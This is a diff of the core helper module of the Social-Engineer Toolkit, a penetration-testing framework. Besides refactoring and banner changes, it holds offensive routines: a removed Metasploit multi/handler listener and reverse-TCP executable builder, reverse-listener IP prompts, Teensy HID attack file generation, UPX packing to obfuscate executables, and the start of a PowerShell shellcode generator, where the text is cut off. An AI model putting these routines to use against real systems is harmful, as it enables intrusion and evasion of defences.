@@ -1,7 +1,8 @@
-#!/usr/bin/env python
-##############################################
-#    Centralized core modules for SET        #
-##############################################
+# !/usr/bin/env python
+#
+# Centralized core modules for SET
+#
+#
 import re
 import sys
 import socket
@@ -18,13 +19,23 @@ from src.core import dictionaries
 import io
 import trace
 
+# python 2 and 3 compatibility
+try:
+    from urllib.request import urlopen
+except ImportError:
+    from urllib import urlopen
+import multiprocessing
+
 if sys.version_info >= (3, 0):
     # python 3 removes reduce from builtin and into functools
     from functools import *
 
-# needed for backwards compatibility of python2 vs 3 - need to convert to threading eventually
-try: import thread
-except ImportError: import _thread as thread
+# needed for backwards compatibility of python2 vs 3 - need to convert to
+# threading eventually
+try:
+    import thread
+except ImportError:
+    import _thread as thread
 
 try:
     raw_input
@@ -37,10 +48,13 @@ try:
 
 except ImportError:
 
-    print("[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
+    print(
+        "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
     pass
 
 # get the main SET path
+
+
 def definepath():
     if check_os() == "posix":
         if os.path.isfile("setoolkit"):
@@ -166,7 +180,8 @@ def setprompt(category, text):
         if text == "":
             for level in category:
                 level = dictionaries.category(level)
-                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
+                prompt += ":" + bcolors.UNDERL + \
+                    bcolors.DARKCYAN + level + bcolors.ENDC
             promptstring = str(prompt)
             promptstring += ">"
             return promptstring
@@ -175,7 +190,8 @@ def setprompt(category, text):
             # iterate through the list received
             for level in category:
                 level = dictionaries.category(level)
-                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
+                prompt += ":" + bcolors.UNDERL + \
+                    bcolors.DARKCYAN + level + bcolors.ENDC
             promptstring = str(prompt)
             promptstring = promptstring + "> " + text + ":"
             return promptstring
@@ -202,7 +218,7 @@ def return_continue():
            "<return> " + bcolors.ENDC + "to continue"))
     pause = raw_input()
 
-############ DEBUGGING ###############
+# DEBUGGING #############
 # ALWAYS SET TO ZERO BEFORE COMMIT!
 DEBUG_LEVEL = 0
 #  0 = Debugging OFF
@@ -234,8 +250,8 @@ def mod_name():
     calling_module = inspect.getmodulename(frame_records[1])
     return calling_module
 
-##########################################
-############ RUNTIME MESSAGES ############
+#
+# RUNTIME MESSAGES ############
 
 
 def print_status(message):
@@ -260,8 +276,10 @@ def print_error(message):
 
 
 def get_version():
-    define_version = '7.1.1'
+    define_version = open("src/core/set.version", "r").read().rstrip()
+    # define_version = '7.2.3'
     return define_version
+
 
 class create_menu:
 
@@ -312,67 +330,75 @@ def meta_path():
     trigger = 0
     try:
 
-                # specific for backbox linux
-        if os.path.isfile("/opt/metasploit-framework/msfconsole"):
-            msf_path = "/opt/metasploit-framework/"
+        # pull from config first
+        msf_path = check_config("METASPLOIT_PATH=")
+        if not str(msf_path.endswith("/")):
+            msf_path = msf_path + "/"
+        if os.path.isfile(msf_path + "msfconsole"):
             trigger = 1
+
+        # if we are using just the standard path for msfconsole
+        if os.path.isfile("/usr/bin/msfconsole"):
+            if trigger == 0:
+                msf_path = "/usr/bin/"
+                trigger = 1
+
+        # specific for backbox linux
+        if os.path.isfile("/opt/metasploit-framework/msfconsole"):
+            if trigger == 0:
+                msf_path = "/opt/metasploit-framework/"
+                trigger = 1
 
         # specific for kali linux
         if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
             # left blank since you can call launcher and ruby1.9 - 2x issues
             # are there
-            msf_path = ""
-            trigger = 1
+            if trigger == 0:
+                msf_path = ""
+                trigger = 1
 
         # specific for backtrack5 and other backtrack versions
         if os.path.isfile("/opt/framework3/msf3/msfconsole"):
-            msf_path = "/opt/framework3/msf3/"
-            trigger = 1
+            if trigger == 0:
+                msf_path = "/opt/framework3/msf3/"
+                trigger = 1
         if os.path.isfile("/opt/framework/msf3/msfconsole"):
-            msf_path = "/opt/framework/msf3/"
-            trigger = 1
+            if trigger == 0:
+                msf_path = "/opt/framework/msf3/"
+                trigger = 1
         if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
-            msf_path = "/opt/metasploit/msf3/"
-            trigger = 1
+            if trigger == 0:
+                msf_path = "/opt/metasploit/msf3/"
+                trigger = 1
 
         # specific for pwnpad and pwnplug (pwnie express)
         if os.path.isfile("/opt/metasploit-framework/msfconsole"):
-            msf_path = "/opt/metasploit-framework/"
-            trigger = 1
+            if trigger == 0:
+                msf_path = "/opt/metasploit-framework/"
+                trigger = 1
 
         # specific for pentesters framework github.com/trustedsec/ptf
         if os.path.isfile("/pentest/exploitation/metasploit/msfconsole"):
-            msf_path = "/pentest/exploitation/metasploit/"
-            trigger = 1
+            if trigger == 0:
+                msf_path = "/pentest/exploitation/metasploit/"
+                trigger = 1
 
-        if os.path.isfile("/usr/bin/msfconsole"):
-            msf_path = ""
-            trigger = 1
+        # Kali linux bleeding edge should return this in order to work
+        if os.path.isfile("/usr/share/metasploit-framework/msfconsole"):
+            if trigger == 0:
+                msf_path = "/usr/share/metasploit-framework/"
+                trigger = 1
 
-        # if we are using windows
-        if check_os() == "windows":
-            print_warning(
-                "Metasploit payloads are not currently supported. This is coming soon.")
-            msf_path = False
-
-    except Exception as e:
-        print_status("Something went wrong. Printing error: " + str(e))
-
-    # if all else fails then pull config path
-    if trigger == 0:
-        msf_path = check_config("METASPLOIT_PATH=")
-        if msf_path.endswith("/"):
-            pass
-
-        else:
-            msf_path = msf_path + "/"
-
-        if not os.path.isfile(msf_path + "/msfconsole"):
+        # if we didn't find anything
+        if trigger == 0:
             print_error(
                 "Metasploit path not found. These payloads will be disabled.")
             print_error(
                 "Please configure Metasploit's path in the /etc/setoolkit/set.config file.")
             msf_path = False
+
+    except Exception as e:
+        print_status("Something went wrong. Printing error: " + str(e))
 
     # this is an option if we don't want to use Metasploit period
     check_metasploit = check_config("METASPLOIT_MODE=").lower()
@@ -402,47 +428,33 @@ def meta_database():
 #
 def grab_ipaddress():
     try:
-        fileopen = open("/etc/setoolkit/set.config", "r").readlines()
-        for line in fileopen:
-            line = line.rstrip()
-            match = re.search("AUTO_DETECT=ON", line)
-            if match:
-                try:
-                    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    rhost.connect(('google.com', 0))
-                    rhost.settimeout(2)
-                    rhost = rhost.getsockname()[0]
-                    return rhost
-                except Exception:
-                    rhost = raw_input(
-                        setprompt("0", "Enter your interface IP Address"))
-                    while 1:
-                        # check if IP address is valid
-                        ip_check = is_valid_ip(rhost)
-                        if ip_check == False:
-                            rhost = raw_input("[!] Invalid ip address try again: ")
-                        if ip_check == True:
-                            break
-                    return rhost
+        rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        rhost.connect(('google.com', 0))
+        rhost.settimeout(2)
+        revipaddr = rhost.getsockname()[0]
+        rhost = raw_input(setprompt("0", "IP address or URL (www.ex.com) for the payload listener (LHOST) [" + revipaddr + "]"))
+        if rhost == "": rhost = revipaddr
 
-        # if AUTO_DETECT=OFF prompt for IP Address
-            match1 = re.search("AUTO_DETECT=OFF", line)
-            if match1:
-                rhost = raw_input(
-                    setprompt("0", "IP address for the payload listener (LHOST)"))
-                while 1:
-                        # check if IP address is valid
-                    ip_check = is_valid_ip(rhost)
-                    if ip_check == False:
-                        rhost = raw_input("[!] Invalid ip address try again: ")
-                    if ip_check == True:
+    except Exception:
+        rhost = raw_input(setprompt("0", "Enter your interface/reverse listener IP Address or URL"))
+
+    if validate_ip(rhost) == False:
+        while 1:
+            choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
+            if choice == "" or choice.lower() == "y":
+                print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
+                break
+            else:
+                rhost = raw_input(setprompt(["2"], "IP address for the reverse connection [" + rhost + "]"))
+                if validate_ip(rhost) == True: break
+                else:
+                    choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
+                    if choice == "" or choice.lower() == "y":
+                        print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                         break
-                return rhost
 
-    except Exception as e:
-        print_error("ERROR:Something went wrong:")
-        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
-
+    # rhost return when verified
+    return rhost
 
 #
 # cleanup old or stale files
@@ -466,6 +478,8 @@ def cleanup_routine():
             os.remove("src/html/index.html")
         if os.path.isfile(setdir + "/Signed_Update.jar"):
             os.remove(setdir + "/Signed_Update.jar")
+        if os.path.isfile(setdir + "/version.lock"):
+            os.remove(setdir + "/version.lock")
 
     except:
         pass
@@ -533,7 +547,7 @@ def date_time():
 
 def generate_random_string(low, high):
     length = random.randint(low, high)
-    letters = string.ascii_letters + string.digits
+    letters = string.ascii_letters # + string.digits
     return ''.join([random.choice(letters) for _ in range(length)])
 
 #
@@ -575,70 +589,11 @@ def site_cloner(website, exportpath, *args):
     subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, setdir,
                                                             exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
-#
-# this will generate a meterpreter reverse payload (executable)
-# with backdoored executable, digital signature stealing, and
-# UPX encoded (if these options are enabled). It will automatically
-# inherit the AUTO_DETECT=ON or OFF configuration.
-#
-# usage: metasploit_reverse_tcp_exe(portnumber)
-#
-
-
-def meterpreter_reverse_tcp_exe(port):
-
-    ipaddr = grab_ipaddress()
-    filewrite = open(setdir + "/interface", "w")
-    filewrite.write(ipaddr)
-    filewrite.close()
-    filewrite = open(setdir + "/ipaddr", "w")
-    filewrite.write(ipaddr)
-    filewrite.close()
-    update_options("IPADDR=" + ipaddr)
-
-    # trigger a flag to be checked in payloadgen
-    # if this flag is true, it will skip the questions
-    filewrite = open(setdir + "/meterpreter_reverse_tcp_exe", "w")
-    filewrite.write(port)
-    filewrite.close()
-    # import the system path for payloadgen in SET
-    sys.path.append("src/core/payloadgen")
-    try:
-        debug_msg("setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
-        module_reload(create_payloads)
-
-    except:
-        debug_msg("setcore", "importing 'src.core.payloadgen.create_payloads'", 1)
-        import create_payloads
-
-    random_value = generate_random_string(5, 10)
-    # copy the created executable to program_junk
-    print_status("Executable created under %s/%s.exe" % (setdir, random_value))
-    subprocess.Popen("cp %s/msf.exe %s/%s.exe" % (setdir, setdir, random_value),
-                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-#
-# Start a metasploit multi handler
-#
-
-
-def metasploit_listener_start(payload, port):
-    # open a file for writing
-    filewrite = open(setdir + "/msf_answerfile", "w")
-    filewrite.write(
-        "use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
-    # close the file
-    filewrite.close()
-    # launch msfconsole
-    metasploit_path = meta_path()
-    subprocess.Popen("%s/msfconsole -r %s/msf_answerfile" %
-                     (metasploit_path, setdir), shell=True).wait()
 
 #
 # This will start a web server in the directory root you specify, so for example
 # you clone a website then run it in that web server, it will pull any index.html file
 #
-
-
 def start_web_server(directory):
     try:
         # import the threading, socketserver, and simplehttpserver
@@ -719,7 +674,8 @@ def java_applet_attack(website, port, directory):
         applet_name = generate_random_string(6, 15) + ".jar"
 
     # lastly we need to copy over the signed applet
-    subprocess.Popen("cp %s/Signed_Update.jar %s/%s" % (setdir, directory, applet_name),
+    subprocess.Popen(
+        "cp %s/Signed_Update.jar %s/%s" % (setdir, directory, applet_name),
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # start the web server by running it in the background
@@ -743,42 +699,42 @@ def teensy_pde_generator(attack_method):
     # if we are doing the attack vector teensy beef
     if attack_method == "beef":
         # specify the filename
-        filename = open("src/teensy/beef.pde", "r")
-        filewrite = open(setdir + "/reports/beef.pde", "w")
+        filename = open("src/teensy/beef.ino", "r")
+        filewrite = open(setdir + "/reports/beef.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.pde" % (setdir))
+            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "powershell_down":
         # specify the filename
-        filename = open("src/teensy/powershell_down.pde", "r")
-        filewrite = open(setdir + "/reports/powershell_down.pde", "w")
+        filename = open("src/teensy/powershell_down.ino", "r")
+        filewrite = open(setdir + "/reports/powershell_down.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
-        filename = open("src/teensy/powershell_reverse.pde", "r")
-        filewrite = open(setdir + "/reports/powershell_reverse.pde", "w")
+        filename = open("src/teensy/powershell_reverse.ino", "r")
+        filewrite = open(setdir + "/reports/powershell_reverse.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "java_applet":
         # specify the filename
-        filename = open("src/teensy/java_applet.pde", "r")
-        filewrite = open(setdir + "/reports/java_applet.pde", "w")
+        filename = open("src/teensy/java_applet.ino", "r")
+        filewrite = open(setdir + "/reports/java_applet.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
-        filename = open("src/teensy/wscript.pde", "r")
-        filewrite = open(setdir + "/reports/wscript.pde", "w")
+        filename = open("src/teensy/wscript.ino", "r")
+        filewrite = open(setdir + "/reports/wscript.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (setdir))
 
     # All the options share this code except binary2teensy
     if attack_method != "binary2teensy":
@@ -794,7 +750,7 @@ def teensy_pde_generator(attack_method):
         # specify the filename
         import src.teensy.binary2teensy
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (setdir))
 
     print_status(teensy_string)
 #
@@ -854,7 +810,8 @@ def upx(path_to_file):
         print_info(
             "Packing the executable and obfuscating PE file randomly, one moment.")
         # packing executable
-        subprocess.Popen("%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir, path_to_file),
+        subprocess.Popen(
+            "%s -9 -q -o %s/temp.binary %s" % (upx_path, setdir, path_to_file),
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
         # move it over the old file
         subprocess.Popen("mv %s/temp.binary %s" % (setdir, path_to_file),
@@ -892,22 +849,75 @@ def show_banner(define_version, graphic):
     print(bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
 [---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
-[---]                Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """                    [---]
-[---]             Codename: '""" + bcolors.YELLOW + """Blue Steel""" + bcolors.ENDC + bcolors.BLUE + """'               [---]
+                      Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
+                   Codename: '""" + bcolors.YELLOW + """Blackout""" + bcolors.ENDC + bcolors.BLUE + """'
 [---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
-
 """ + bcolors.GREEN + """        Welcome to the Social-Engineer Toolkit (SET).
          The one stop shop for all of your SE needs.
 """)
-    print(bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC)
-    print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ +
+    print(bcolors.BLUE +
+          """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC)
+    print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ +
           bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC)
+    print(bcolors.BLUE + """   It's easy to update using the PenTesters Framework! (PTF)\nVisit """ + bcolors.YELLOW +
+          """https://github.com/trustedsec/ptf""" + bcolors.BLUE + """ to update all your tools!\n\n""" + bcolors.ENDC)
+
+    # here we check if  there is a new version of SET - if there is, then
+    # display a banner
+    cv = get_version()
+
+    # pull version
+    try:
+        version = ""
+
+        def pull_version():
+            if not os.path.isfile(setdir + "/version.lock"):
+                try:
+
+                    url = (
+                        'https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/set.version')
+                    version = urlopen(url).read().rstrip().decode('utf-8')
+                    filewrite = open(setdir + "/version.lock", "w")
+                    filewrite.write(version)
+                    filewrite.close()
+
+                except KeyboardInterrupt:
+                    version = "keyboard interrupt"
+
+            else:
+                version = open(setdir + "/version.lock", "r").read()
+
+            if cv != version:
+                if version != "":
+                    print(bcolors.RED + "          There is a new version of SET available.\n                    " + bcolors.GREEN + " Your version: " + bcolors.RED + cv + bcolors.GREEN +
+                          "\n                  Current version: " + bcolors.ENDC + bcolors.BOLD + version + bcolors.YELLOW + "\n\nPlease update SET to the latest before submitting any git issues.\n\n" + bcolors.ENDC)
+
+        # why urllib and sockets cant control DNS resolvers is beyond me - so
+        # we use this as a hack job to add a delay and kill if updates are
+        # taking too long
+        p = multiprocessing.Process(target=pull_version)
+        p.start()
+
+        # Wait for 5 seconds or until process finishes
+        p.join(8)
+
+        # If thread is still active
+        if p.is_alive():
+            print(
+                bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC)
+            # terminate the process
+            p.terminate()
+            p.join()
+
+    except Exception as err:
+        print(err)
+        # pass
 
 
 def show_graphic():
-    menu = random.randrange(2, 13)
+    menu = random.randrange(2, 15)
     if menu == 2:
         print(bcolors.YELLOW + r"""
                  .--.  .--. .-----.
@@ -990,27 +1000,27 @@ def show_graphic():
 
     if menu == 9:
         print(bcolors.YELLOW + """
-     01011001011011110111010100100000011100
-     10011001010110000101101100011011000111
-     10010010000001101000011000010111011001
-     10010100100000011101000110111100100000
-     01101101011101010110001101101000001000
-     00011101000110100101101101011001010010
-     00000110111101101110001000000111100101
-     10111101110101011100100010000001101000
-     01100001011011100110010001110011001000
-     00001110100010110100101001001000000101
-     01000110100001100001011011100110101101
-     11001100100000011001100110111101110010
-     00100000011101010111001101101001011011
-     10011001110010000001110100011010000110
-     01010010000001010011011011110110001101
-     10100101100001011011000010110101000101
-     01101110011001110110100101101110011001
-     01011001010111001000100000010101000110
-     11110110111101101100011010110110100101
-     11010000100000001010100110100001110101
-     011001110111001100101010""" + bcolors.ENDC)
+         01011001011011110111010100100000011100
+         10011001010110000101101100011011000111
+         10010010000001101000011000010111011001
+         10010100100000011101000110111100100000
+         01101101011101010110001101101000001000
+         00011101000110100101101101011001010010
+         00000110111101101110001000000111100101
+         10111101110101011100100010000001101000
+         01100001011011100110010001110011001000
+         00001110100010110100101001001000000101
+         01000110100001100001011011100110101101
+         11001100100000011001100110111101110010
+         00100000011101010111001101101001011011
+         10011001110010000001110100011010000110
+         01010010000001010011011011110110001101
+         10100101100001011011000010110101000101
+         01101110011001110110100101101110011001
+         01011001010111001000100000010101000110
+         11110110111101101100011010110110100101
+         11010000100000001010100110100001110101
+         011001110111001100101010""" + bcolors.ENDC)
 
     if menu == 10:
         print(bcolors.GREEN + """
@@ -1035,7 +1045,6 @@ def show_graphic():
                   $MM                .MM.
                     ,MM?          .MMM
                        ,MMMMMMMMMMM
-
                 https://www.trustedsec.com""" + bcolors.ENDC)
 
     if menu == 11:
@@ -1063,6 +1072,36 @@ def show_graphic():
                  -------------------                                  !""" + bcolors.ENDC)
 
     if menu == 12:
+        print(bcolors.YELLOW + r'''
+           ,..-,
+         ,;;f^^"""-._
+        ;;'          `-.
+       ;/               `.
+       ||  _______________\_______________________
+       ||  |HHHHHHHHHHPo"~~\"o?HHHHHHHHHHHHHHHHHHH|
+       ||  |HHHHHHHHHP-._   \,'?HHHHHHHHHHHHHHHHHH|
+        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|
+        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'|HHHHH|
+        `| |HHHHHb.?Hb    .--J-dHP,dHHPo'_.rdHHHHH|
+         \ |HHHi.`;;.H`-./__/-'H_,--'/;rdHHHHHHHHH|
+           |HHHboo.\ `|"\"/"\" '/\ .'dHHHHHHHHHHHH|
+           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|
+           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|
+           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|
+           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|
+           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|
+           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|
+           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|
+           |""""""""""""""""""""""""""""""""""""""|
+           |,;=====.     ,-.  =.       ,=,,=====. |
+           |||     '    //"\\   \\   //  ||     ' |
+           |||         ,/' `\.  `\. ,/'  ``=====. |
+           |||     .   //"""\\   \\_//    .     |||
+           |`;=====' =''     ``=  `-'     `=====''|
+           |______________________________________|
+	''')
+
+    if menu == 13:
         print(bcolors.RED + r"""
                       ..:::::::::..
                   ..:::aad8888888baa:::..
@@ -1085,6 +1124,72 @@ def show_graphic():
               `::::::88::88:::::::88::::::'
                  ``:::::::::::::::::::''
                       ``:::::::::''""" + bcolors.ENDC)
+
+    if menu == 14:
+        print(bcolors.BOLD + """
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XX                                                                          XX
+XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
+XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
+XX   MMMMMy''                                                    ''yMMMMM   XX
+XX   MMMy'                                                          'yMMM   XX
+XX   Mh'                                                              'hM   XX
+XX   -                                                                  -   XX
+XX                                                                          XX
+XX   ::                                                                ::   XX
+XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
+XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
+XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
+XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
+XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
+XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
+XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
+XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
+XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
+XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
+XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
+XX                                oo      oo                                XX
+XX           oM                 oo          oo                 Mo           XX
+XX         oMMo                M              M                oMMo         XX
+XX       +MMMM                 s              s                 MMMM+       XX
+XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
+XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
+XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
+XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
+XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
+XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
+XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
+XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
+XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
+XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
+XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
+XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
+XX   MMMMMMMM-                                                  -MMMMMMMM   XX
+XX   MMMMMMMMM                                                  MMMMMMMMM   XX
+XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
+XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
+XX                                                                          XX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    .o88o.                               o8o                .
+    888 `"                               `"'              .o8
+   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
+    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
+    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
+    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
+   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
+                                                                .o...P'
+                                                                `XER0'
+""" + bcolors.ENDC)
 
 #
 # identify if set interactive shells are disabled
@@ -1115,7 +1220,8 @@ def menu_back():
 def custom_template():
     try:
         print ("         [****]  Custom Template Generator [****]\n")
-        print ("Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
+        print (
+            "Always looking for new templates! In the set/src/templates directory send an email\nto info@trustedsec.com if you got a good template!")
         author = raw_input(setprompt("0", "Enter the name of the author"))
         filename = randomgen = random.randrange(1, 99999999999999999999)
         filename = str(filename) + (".template")
@@ -1149,7 +1255,7 @@ def check_length(choice, max):
     while 1:
         if counter == 1:
             choice = raw_input(bcolors.YELLOW + bcolors.BOLD +
-                           "[!] " + bcolors.ENDC + "Invalid choice try again: ")
+                               "[!] " + bcolors.ENDC + "Invalid choice try again: ")
         # try block in case its not a integer
         try:
             # check to see if its an integer
@@ -1273,7 +1379,7 @@ def check_config(param):
                 # remove any quotes or single quotes
                 line = line.replace('"', "")
                 line = line.replace("'", "")
-                line = line.split("=")
+                line = line.split("=", 1)
                 return line[1]
 
 # copy an entire folder function
@@ -1308,15 +1414,17 @@ def copyfolder(sourcePath, destPath):
 def check_options(option):
         # open the directory
     trigger = 0
-    fileopen = open(setdir + "/set.options", "r").readlines()
-    for line in fileopen:
-        match = re.search(option, line)
-        if match:
-            line = line.rstrip()
-            line = line.replace('"', "")
-            line = line.split("=")
-            return line[1]
-            trigger = 1
+    if os.path.isfile(setdir + "/set.options"):
+        fileopen = open(setdir + "/set.options", "r").readlines()
+        for line in fileopen:
+            match = re.search(option, line)
+            if match:
+                line = line.rstrip()
+                line = line.replace('"', "")
+                line = line.split("=")
+                return line[1]
+                trigger = 1
+
     if trigger == 0:
         return trigger
 
@@ -1375,13 +1483,13 @@ def socket_listener(port):
 
 
 def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
-
     # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
     try:
 
         # if not "reverse_http" in payload or not "reverse_https" in payload:
-        shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
